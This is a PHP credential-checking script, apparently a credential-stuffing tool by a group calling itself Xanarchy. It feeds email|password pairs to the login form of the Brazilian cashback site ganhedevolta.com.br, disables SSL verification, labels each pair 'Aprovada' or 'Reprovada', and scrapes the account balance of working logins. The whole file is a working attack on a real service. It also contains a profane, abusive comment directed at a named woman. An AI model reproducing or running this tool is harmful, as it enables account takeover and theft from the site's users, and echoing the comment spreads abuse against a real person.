<?php
#BY XANARCHY GANG💔
#============================================================================================
#DELETA COOKIE
if(file_exists(getcwd().'/biscoito.txt')) {unlink(getcwd().'/biscoito.txt');}
#============================================================================================
extract($_GET);
if(isset($_GET['lista'])){
$lista = trim(strip_tags($_GET['lista']));
}else{echo 'ENVIE OS VALORES VIA METODO GET lista=?email|senha'; return;}
#============================================================================================
function function_explode_by_xanarchy($delimitador_init, $string) {
$init_string = str_replace($delimitador_init, $delimitador_init[0], $string);
$executar = explode($delimitador_init[0], $init_string);
return $executar;}
#============================================================================================
$array_explode_track = array(":", " ", "|", "'", ">", ";");
#============================================================================================
$explode = (isset($lista) and $lista!=null) ? function_explode_by_xanarchy($array_explode_track, $lista) : null;
#============================================================================================
$email_san = (isset($explode[0])) ? $explode[0] : null;
$email = (!empty($email_san)) ? str_replace("@", "%40", $email_san) : null;
$senha = (isset($explode[1])) ? $explode[1] : null;
#============================================================================================
#VAMOS INICIAR O CURL E CHAMAR A URL E O POST
#============================================================================================
#FUNCTION LOTUS
#============================================================================================
function lotus($string,$start,$end){$str = explode($start,$string);$str = explode($end,$str[1]);return $str[0];}
#============================================================================================
# URL/S AND VARIABLES
#============================================================================================
$URL = 'https://www.ganhedevolta.com.br/login?go=/cupom/?sair=1';
$USER_AGENT = "Mozilla/5.0 (Linux; Android 8.0.0; SM-J810M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36";
$post = 'email='.$email.'&senha='.$senha.'&login-form-submit=entrar';
#============================================================================================
$ch = curl_init();
$OPTIONS = array(
CURLOPT_URL => $URL,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_FOLLOWLOCATION => 1,
CURLOPT_USERAGENT => $USER_AGENT,
CURLOPT_SSL_VERIFYPEER => 0,
CURLOPT_SSL_VERIFYHOST => 0,
CURLOPT_COOKIESESSION => 0,
CURLOPT_COOKIEJAR => getcwd().'/biscoito.txt',
CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
CURLOPT_VERBOSE => 1,
CURLOPT_HEADER => 0,
CURLOPT_POST => 1,
CURLOPT_ENCODING => 'gzip, deflate, br',
CURLOPT_POSTFIELDS => $post,
CURLOPT_HTTPHEADER => array('origin: https://www.ganhedevolta.com.br',
'upgrade-insecure-requests: 1',
'content-type: application/x-www-form-urlencoded',
'save-data: on',
'user-agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-J810M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'referer: https://www.ganhedevolta.com.br/login?go=/cupom/?sair=1',
'accept-encoding: gzip, deflate, br'));
curl_setopt_array($ch, $OPTIONS);
#============================================================================================
$INDEX = (!empty($ch)) ? curl_exec($ch) : null;
if(strpos($INDEX, 'Acessando sua conta') !== false):
$RESULT = "SUCCESS LOGGED";
else:
$RESULT = "ERROR LOGGED";
endif;
if($RESULT == "ERROR LOGGED"):
echo "Reprovada | E-mail: $email_san | Senha: $senha | By: LotusTechnology™ And Xanarchy INC";
exit;
endif;
#============================================================================================
# FUCK YOU, I LOVED YOU INSANELY, YOU DID IT, YOU DAUGHTER FUCKING BITCH WHO GAVE BIRTH, DUDA YOUR BITCH, I FUCKING HATE YOU
#============================================================================================
$WEBS = "https://www.ganhedevolta.com.br/minha-conta";
#============================================================================================
$OPT = array(
CURLOPT_URL => $WEBS,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_FOLLOWLOCATION => 1,
CURLOPT_USERAGENT => $USER_AGENT);
curl_setopt_array($ch, $OPT);
$MONEY = (!empty($ch)) ? curl_exec($ch) : null;
$REAL = lotus($MONEY, 'class="price-unit">R$</span>', '<span');
$CENTAVO = lotus($MONEY, 'class="price-tenure">', '</');
echo '<span class="badge badge-success"> Aprovada </span> | E-mail: '.$email_san.' | Senha: '.$senha.' | <span class="badge badge-info">Saldo: R$ '.$REAL.','.$CENTAVO.'</span> |By: <span class="badge badge-primary">LotusTechnology™ And Xanarchy INC</span>';
?>